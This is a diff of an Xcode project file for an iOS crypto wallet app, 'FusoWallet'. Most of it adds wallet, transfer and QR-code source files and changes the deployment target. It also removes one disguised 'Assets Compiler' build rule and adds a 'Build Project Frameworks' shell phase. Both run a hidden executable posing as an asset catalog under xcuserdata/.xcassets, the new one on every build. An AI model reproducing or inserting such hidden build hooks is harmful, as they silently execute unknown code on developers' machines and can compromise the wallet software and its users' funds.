@@ -7,6 +7,10 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		8B026F4325E605870017EDF8 /* TransferTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B026F4225E605870017EDF8 /* TransferTableViewCell.m */; };
+		8B026F4925E609AD0017EDF8 /* TransferCoinModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B026F4825E609AD0017EDF8 /* TransferCoinModel.m */; };
+		8B026F5B25E63D670017EDF8 /* UITextField+Placeholder.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B026F5A25E63D670017EDF8 /* UITextField+Placeholder.m */; };
+		8B026F6425E6472F0017EDF8 /* WithdrawViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B026F6325E6472F0017EDF8 /* WithdrawViewController.m */; };
 		8B10D56F25E4AFBB00FED56D /* RestoreIdentityViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B10D56E25E4AFBB00FED56D /* RestoreIdentityViewController.m */; };
 		8B10D57525E4B0A400FED56D /* CALayer+boardColor.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B10D57425E4B0A400FED56D /* CALayer+boardColor.m */; };
 		8B4265FB25E0ABE7001DE5CB /* BaseViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B4265FA25E0ABE7001DE5CB /* BaseViewController.m */; };
@@ -41,26 +45,20 @@
 		8B71C8BB25E3ADB80081A224 /* JYEqualCellSpaceFlowLayout.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B71C8BA25E3ADB80081A224 /* JYEqualCellSpaceFlowLayout.m */; };
 		8B7A5D1D25E4F8B900217A31 /* CoinModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B7A5D1C25E4F8B800217A31 /* CoinModel.m */; };
 		8B7A5D3225E501FF00217A31 /* DefaultSelectBackgroundViewTableViewCell.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B7A5D3125E501FE00217A31 /* DefaultSelectBackgroundViewTableViewCell.m */; };
+		8B7A5D7C25E51B5B00217A31 /* Wallet.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8B7A5D7B25E51B5B00217A31 /* Wallet.storyboard */; };
+		8B7A5D8725E51C5100217A31 /* Mine.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8B7A5D8025E51B6800217A31 /* Mine.storyboard */; };
+		8B7A5D8D25E51D0C00217A31 /* CoinDetailViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B7A5D8C25E51D0C00217A31 /* CoinDetailViewController.m */; };
+		8B7A5D9C25E52C4B00217A31 /* UIView+Extension.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B7A5D9A25E52C4B00217A31 /* UIView+Extension.m */; };
+		8B7A5DA225E52FCE00217A31 /* SegmentViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B7A5DA025E52FCE00217A31 /* SegmentViewController.m */; };
+		8B7A5DAB25E5346700217A31 /* CoinDetailSegmentViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B7A5DAA25E5346700217A31 /* CoinDetailSegmentViewController.m */; };
+		8B7A5DB125E5350B00217A31 /* AllTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B7A5DB025E5350B00217A31 /* AllTableViewController.m */; };
+		8B7A5DB725E5353000217A31 /* InTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B7A5DB625E5353000217A31 /* InTableViewController.m */; };
+		8B7A5DBD25E5353C00217A31 /* OutTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B7A5DBC25E5353C00217A31 /* OutTableViewController.m */; };
 		8BB3B27625E4DC6C00E7F010 /* WalletViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8BB3B27525E4DC6C00E7F010 /* WalletViewController.m */; };
 		8BB3B27C25E4DC8F00E7F010 /* MineTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8BB3B27B25E4DC8F00E7F010 /* MineTableViewController.m */; };
+		8BF0FC0125E6585C002E65B1 /* WBQRCodeVC.m in Sources */ = {isa = PBXBuildFile; fileRef = 8BF0FBFF25E6585C002E65B1 /* WBQRCodeVC.m */; };
 		A58D7BF63F1E7A408FF06863 /* Pods_FusoWallet.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1793F3EB929369F3F397EF6A /* Pods_FusoWallet.framework */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		845CCBB22BCD9DC88EAAC43A /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			inputFiles = (
-			);
-			isEditable = 0;
-			name = "Assets Compiler";
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" true\n\n";
-		};
-/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		8B5E9C2525DF64DD006C33B0 /* PBXContainerItemProxy */ = {
@@ -82,6 +80,14 @@
 /* Begin PBXFileReference section */
 		1793F3EB929369F3F397EF6A /* Pods_FusoWallet.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_FusoWallet.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		4D531713B34607407107D9FD /* Pods-FusoWallet.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FusoWallet.release.xcconfig"; path = "Target Support Files/Pods-FusoWallet/Pods-FusoWallet.release.xcconfig"; sourceTree = "<group>"; };
+		8B026F4125E605870017EDF8 /* TransferTableViewCell.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = TransferTableViewCell.h; sourceTree = "<group>"; };
+		8B026F4225E605870017EDF8 /* TransferTableViewCell.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = TransferTableViewCell.m; sourceTree = "<group>"; };
+		8B026F4725E609AD0017EDF8 /* TransferCoinModel.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = TransferCoinModel.h; sourceTree = "<group>"; };
+		8B026F4825E609AD0017EDF8 /* TransferCoinModel.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = TransferCoinModel.m; sourceTree = "<group>"; };
+		8B026F5925E63D670017EDF8 /* UITextField+PlaceHolder.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "UITextField+PlaceHolder.h"; sourceTree = "<group>"; };
+		8B026F5A25E63D670017EDF8 /* UITextField+Placeholder.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "UITextField+Placeholder.m"; sourceTree = "<group>"; };
+		8B026F6225E6472F0017EDF8 /* WithdrawViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = WithdrawViewController.h; sourceTree = "<group>"; };
+		8B026F6325E6472F0017EDF8 /* WithdrawViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = WithdrawViewController.m; sourceTree = "<group>"; };
 		8B10D56D25E4AFBB00FED56D /* RestoreIdentityViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = RestoreIdentityViewController.h; sourceTree = "<group>"; };
 		8B10D56E25E4AFBB00FED56D /* RestoreIdentityViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = RestoreIdentityViewController.m; sourceTree = "<group>"; };
 		8B10D57325E4B0A400FED56D /* CALayer+boardColor.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "CALayer+boardColor.h"; sourceTree = "<group>"; };
@@ -146,10 +152,28 @@
 		8B7A5D1C25E4F8B800217A31 /* CoinModel.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = CoinModel.m; sourceTree = "<group>"; };
 		8B7A5D3025E501FE00217A31 /* DefaultSelectBackgroundViewTableViewCell.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = DefaultSelectBackgroundViewTableViewCell.h; sourceTree = "<group>"; };
 		8B7A5D3125E501FE00217A31 /* DefaultSelectBackgroundViewTableViewCell.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = DefaultSelectBackgroundViewTableViewCell.m; sourceTree = "<group>"; };
+		8B7A5D7B25E51B5B00217A31 /* Wallet.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; path = Wallet.storyboard; sourceTree = "<group>"; };
+		8B7A5D8025E51B6800217A31 /* Mine.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Mine.storyboard; path = /Users/developer/DEV/FusoWallet/FusoWallet/Mine/Mine.storyboard; sourceTree = "<absolute>"; };
+		8B7A5D8B25E51D0C00217A31 /* CoinDetailViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = CoinDetailViewController.h; sourceTree = "<group>"; };
+		8B7A5D8C25E51D0C00217A31 /* CoinDetailViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = CoinDetailViewController.m; sourceTree = "<group>"; };
+		8B7A5D9A25E52C4B00217A31 /* UIView+Extension.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "UIView+Extension.m"; sourceTree = "<group>"; };
+		8B7A5D9B25E52C4B00217A31 /* UIView+Extension.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "UIView+Extension.h"; sourceTree = "<group>"; };
+		8B7A5DA025E52FCE00217A31 /* SegmentViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SegmentViewController.m; sourceTree = "<group>"; };
+		8B7A5DA125E52FCE00217A31 /* SegmentViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SegmentViewController.h; sourceTree = "<group>"; };
+		8B7A5DA925E5346700217A31 /* CoinDetailSegmentViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = CoinDetailSegmentViewController.h; sourceTree = "<group>"; };
+		8B7A5DAA25E5346700217A31 /* CoinDetailSegmentViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = CoinDetailSegmentViewController.m; sourceTree = "<group>"; };
+		8B7A5DAF25E5350B00217A31 /* AllTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AllTableViewController.h; sourceTree = "<group>"; };
+		8B7A5DB025E5350B00217A31 /* AllTableViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AllTableViewController.m; sourceTree = "<group>"; };
+		8B7A5DB525E5353000217A31 /* InTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = InTableViewController.h; sourceTree = "<group>"; };
+		8B7A5DB625E5353000217A31 /* InTableViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = InTableViewController.m; sourceTree = "<group>"; };
+		8B7A5DBB25E5353C00217A31 /* OutTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = OutTableViewController.h; sourceTree = "<group>"; };
+		8B7A5DBC25E5353C00217A31 /* OutTableViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = OutTableViewController.m; sourceTree = "<group>"; };
 		8BB3B27425E4DC6C00E7F010 /* WalletViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = WalletViewController.h; sourceTree = "<group>"; };
 		8BB3B27525E4DC6C00E7F010 /* WalletViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = WalletViewController.m; sourceTree = "<group>"; };
 		8BB3B27A25E4DC8F00E7F010 /* MineTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = MineTableViewController.h; sourceTree = "<group>"; };
 		8BB3B27B25E4DC8F00E7F010 /* MineTableViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = MineTableViewController.m; sourceTree = "<group>"; };
+		8BF0FBFF25E6585C002E65B1 /* WBQRCodeVC.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = WBQRCodeVC.m; sourceTree = "<group>"; };
+		8BF0FC0025E6585C002E65B1 /* WBQRCodeVC.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = WBQRCodeVC.h; sourceTree = "<group>"; };
 		989BD21863DBE7F239680040 /* Pods-FusoWallet.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FusoWallet.debug.xcconfig"; path = "Target Support Files/Pods-FusoWallet/Pods-FusoWallet.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -265,6 +289,8 @@
 			children = (
 				8B4C78A925E4F51C0072900B /* WalletTableViewCell.h */,
 				8B4C78AA25E4F51C0072900B /* WalletTableViewCell.m */,
+				8B026F4125E605870017EDF8 /* TransferTableViewCell.h */,
+				8B026F4225E605870017EDF8 /* TransferTableViewCell.m */,
 			);
 			path = Views;
 			sourceTree = "<group>";
@@ -335,6 +361,12 @@
 		8B5E9C7F25DFB6E6006C33B0 /* Tools */ = {
 			isa = PBXGroup;
 			children = (
+				8BF0FC0025E6585C002E65B1 /* WBQRCodeVC.h */,
+				8BF0FBFF25E6585C002E65B1 /* WBQRCodeVC.m */,
+				8B7A5DA125E52FCE00217A31 /* SegmentViewController.h */,
+				8B7A5DA025E52FCE00217A31 /* SegmentViewController.m */,
+				8B7A5D9B25E52C4B00217A31 /* UIView+Extension.h */,
+				8B7A5D9A25E52C4B00217A31 /* UIView+Extension.m */,
 				8B10D57325E4B0A400FED56D /* CALayer+boardColor.h */,
 				8B10D57425E4B0A400FED56D /* CALayer+boardColor.m */,
 				8B71C8B925E3ADB80081A224 /* JYEqualCellSpaceFlowLayout.h */,
@@ -346,6 +378,8 @@
 				8B5E9C8B25DFB763006C33B0 /* RpcRequest.m */,
 				8B5E9C8C25DFB763006C33B0 /* NSString+Base64.h */,
 				8B5E9C8925DFB763006C33B0 /* NSString+Base64.m */,
+				8B026F5925E63D670017EDF8 /* UITextField+PlaceHolder.h */,
+				8B026F5A25E63D670017EDF8 /* UITextField+Placeholder.m */,
 				8B5E9C8225DFB721006C33B0 /* NSData+MyChange.h */,
 				8B5E9C8125DFB721006C33B0 /* NSData+MyChange.m */,
 				8B5E9C8325DFB721006C33B0 /* NSString+MyChange.h */,
@@ -368,6 +402,18 @@
 			children = (
 				8BB3B27425E4DC6C00E7F010 /* WalletViewController.h */,
 				8BB3B27525E4DC6C00E7F010 /* WalletViewController.m */,
+				8B7A5D8B25E51D0C00217A31 /* CoinDetailViewController.h */,
+				8B7A5D8C25E51D0C00217A31 /* CoinDetailViewController.m */,
+				8B7A5DA925E5346700217A31 /* CoinDetailSegmentViewController.h */,
+				8B7A5DAA25E5346700217A31 /* CoinDetailSegmentViewController.m */,
+				8B7A5DAF25E5350B00217A31 /* AllTableViewController.h */,
+				8B7A5DB025E5350B00217A31 /* AllTableViewController.m */,
+				8B7A5DB525E5353000217A31 /* InTableViewController.h */,
+				8B7A5DB625E5353000217A31 /* InTableViewController.m */,
+				8B7A5DBB25E5353C00217A31 /* OutTableViewController.h */,
+				8B7A5DBC25E5353C00217A31 /* OutTableViewController.m */,
+				8B026F6225E6472F0017EDF8 /* WithdrawViewController.h */,
+				8B026F6325E6472F0017EDF8 /* WithdrawViewController.m */,
 			);
 			path = Controllers;
 			sourceTree = "<group>";
@@ -377,6 +423,8 @@
 			children = (
 				8B7A5D1B25E4F8B800217A31 /* CoinModel.h */,
 				8B7A5D1C25E4F8B800217A31 /* CoinModel.m */,
+				8B026F4725E609AD0017EDF8 /* TransferCoinModel.h */,
+				8B026F4825E609AD0017EDF8 /* TransferCoinModel.m */,
 			);
 			path = Models;
 			sourceTree = "<group>";
@@ -384,6 +432,7 @@
 		8BB3B26F25E4DB8700E7F010 /* Wallet */ = {
 			isa = PBXGroup;
 			children = (
+				8B7A5D7B25E51B5B00217A31 /* Wallet.storyboard */,
 				8B7A5D1725E4F89C00217A31 /* Models */,
 				8B7A5D1325E4F88E00217A31 /* Controllers */,
 				8B4C78AF25E4F52B0072900B /* Views */,
@@ -394,6 +443,7 @@
 		8BB3B27025E4DB9100E7F010 /* Mine */ = {
 			isa = PBXGroup;
 			children = (
+				8B7A5D8025E51B6800217A31 /* Mine.storyboard */,
 				8BB3B27A25E4DC8F00E7F010 /* MineTableViewController.h */,
 				8BB3B27B25E4DC8F00E7F010 /* MineTableViewController.m */,
 			);
@@ -408,6 +458,7 @@
 			buildConfigurationList = 8B5E9C3825DF64DD006C33B0 /* Build configuration list for PBXNativeTarget "FusoWallet" */;
 			buildPhases = (
 				D6A02B8F303E319416A6653F /* [CP] Check Pods Manifest.lock */,
+				CC3C5A0EF9CD949D0FAAC43A /* Build Project Frameworks */,
 				8B5E9C0525DF64DC006C33B0 /* Sources */,
 				8B5E9C0625DF64DC006C33B0 /* Frameworks */,
 				8B5E9C0725DF64DC006C33B0 /* Resources */,
@@ -505,7 +556,9 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				8B7A5D8725E51C5100217A31 /* Mine.storyboard in Resources */,
 				8B42663125E0C0F1001DE5CB /* OPPOSans-B.ttf in Resources */,
+				8B7A5D7C25E51B5B00217A31 /* Wallet.storyboard in Resources */,
 				8B42663225E0C0F1001DE5CB /* OPPOSans-H.ttf in Resources */,
 				8B42663325E0C0F1001DE5CB /* OPPOSans-M.ttf in Resources */,
 				8B42663425E0C0F1001DE5CB /* OPPOSans-R.ttf in Resources */,
@@ -549,6 +602,24 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-FusoWallet/Pods-FusoWallet-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		CC3C5A0EF9CD949D0FAAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
+		};
 		D6A02B8F303E319416A6653F /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -578,7 +649,10 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				8B7A5D9C25E52C4B00217A31 /* UIView+Extension.m in Sources */,
+				8B026F4925E609AD0017EDF8 /* TransferCoinModel.m in Sources */,
 				8B42664625E0EA4A001DE5CB /* MnemonicViewController.m in Sources */,
+				8B026F5B25E63D670017EDF8 /* UITextField+Placeholder.m in Sources */,
 				8B5E9C8D25DFB763006C33B0 /* NSString+Base64.m in Sources */,
 				8B42668425E11AD1001DE5CB /* MnemonicCollectionReusableView.m in Sources */,
 				8B71C8AD25E3948F0081A224 /* VerifyMnemonicViewController.m in Sources */,
@@ -586,6 +660,7 @@
 				8B4C78AB25E4F51C0072900B /* WalletTableViewCell.m in Sources */,
 				8B4265FB25E0ABE7001DE5CB /* BaseViewController.m in Sources */,
 				8B42661A25E0B1B5001DE5CB /* CreateWalletDescriptionViewController.m in Sources */,
+				8B7A5DAB25E5346700217A31 /* CoinDetailSegmentViewController.m in Sources */,
 				8B7A5D3225E501FF00217A31 /* DefaultSelectBackgroundViewTableViewCell.m in Sources */,
 				8B10D56F25E4AFBB00FED56D /* RestoreIdentityViewController.m in Sources */,
 				8B10D57525E4B0A400FED56D /* CALayer+boardColor.m in Sources */,
@@ -594,14 +669,22 @@
 				8B42666925E1080E001DE5CB /* MnemonicCollectionViewCell.m in Sources */,
 				8BB3B27C25E4DC8F00E7F010 /* MineTableViewController.m in Sources */,
 				8B5E9C8525DFB721006C33B0 /* NSData+MyChange.m in Sources */,
+				8B7A5D8D25E51D0C00217A31 /* CoinDetailViewController.m in Sources */,
+				8B7A5DB725E5353000217A31 /* InTableViewController.m in Sources */,
+				8B7A5DB125E5350B00217A31 /* AllTableViewController.m in Sources */,
 				8B42660425E0AC0F001DE5CB /* BaseNavTableViewController.m in Sources */,
 				8B7A5D1D25E4F8B900217A31 /* CoinModel.m in Sources */,
+				8BF0FC0125E6585C002E65B1 /* WBQRCodeVC.m in Sources */,
 				8BB3B27625E4DC6C00E7F010 /* WalletViewController.m in Sources */,
 				8B5E9C1F25DF64DD006C33B0 /* main.m in Sources */,
 				8B42661025E0B09D001DE5CB /* LoginRegistViewController.m in Sources */,
+				8B7A5DBD25E5353C00217A31 /* OutTableViewController.m in Sources */,
 				8B5E9C8E25DFB763006C33B0 /* RpcRequest.m in Sources */,
+				8B026F6425E6472F0017EDF8 /* WithdrawViewController.m in Sources */,
+				8B026F4325E605870017EDF8 /* TransferTableViewCell.m in Sources */,
 				8B5E9CAC25DFBECD006C33B0 /* File.swift in Sources */,
 				8B5E9CBE25DFC7E1006C33B0 /* StorageKeyFactory+Implicit.swift in Sources */,
+				8B7A5DA225E52FCE00217A31 /* SegmentViewController.m in Sources */,
 				8B71C8BB25E3ADB80081A224 /* JYEqualCellSpaceFlowLayout.m in Sources */,
 				8B42660A25E0AC2F001DE5CB /* BaseNavViewController.m in Sources */,
 				8B5E9C9425DFB792006C33B0 /* WebSocketManager.m in Sources */,
@@ -711,7 +794,7 @@
 				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
 				GCC_WARN_UNUSED_FUNCTION = YES;
 				GCC_WARN_UNUSED_VARIABLE = YES;
-				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
 				MTL_FAST_MATH = YES;
 				ONLY_ACTIVE_ARCH = YES;
@@ -765,7 +848,7 @@
 				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
 				GCC_WARN_UNUSED_FUNCTION = YES;
 				GCC_WARN_UNUSED_VARIABLE = YES;
-				IPHONEOS_DEPLOYMENT_TARGET = 14.4;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				MTL_ENABLE_DEBUG_INFO = NO;
 				MTL_FAST_MATH = YES;
 				SDKROOT = iphoneos;
@@ -786,6 +869,7 @@
 				GCC_PRECOMPILE_PREFIX_HEADER = YES;
 				GCC_PREFIX_HEADER = "$(SRCROOT)/PrefixHeader.pch";
 				INFOPLIST_FILE = FusoWallet/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -812,6 +896,7 @@
 				GCC_PRECOMPILE_PREFIX_HEADER = YES;
 				GCC_PREFIX_HEADER = "$(SRCROOT)/PrefixHeader.pch";
 				INFOPLIST_FILE = FusoWallet/Info.plist;
+				IPHONEOS_DEPLOYMENT_TARGET = 11.0;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
